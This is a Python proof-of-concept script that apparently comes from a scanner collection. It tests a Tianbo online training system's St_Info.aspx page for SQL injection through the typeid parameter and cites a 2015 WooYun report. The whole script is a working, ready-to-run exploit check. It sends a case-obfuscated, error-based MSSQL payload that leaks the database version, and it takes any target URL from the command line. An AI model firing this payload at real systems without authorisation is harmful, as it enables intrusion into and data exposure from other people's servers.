#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 天柏在线培训系统St_Info.aspx SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0121651
author: Lucifer
description: 文件/Web_Org/St_Info.aspx中,参数typeid存在SQL注入。
'''
import sys
import requests



class tianbo_St_Info_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/Web_Org/St_Info.aspx?typeid=3%20AnD%201=CoNvErT(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@VeRsIoN)--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"WtFaBcMicrosoft" in req.text:
                return "[+]存在天柏在线培训系统St_Info.aspx SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = tianbo_St_Info_sqli_BaseVerify(sys.argv[1])
    testVuln.run()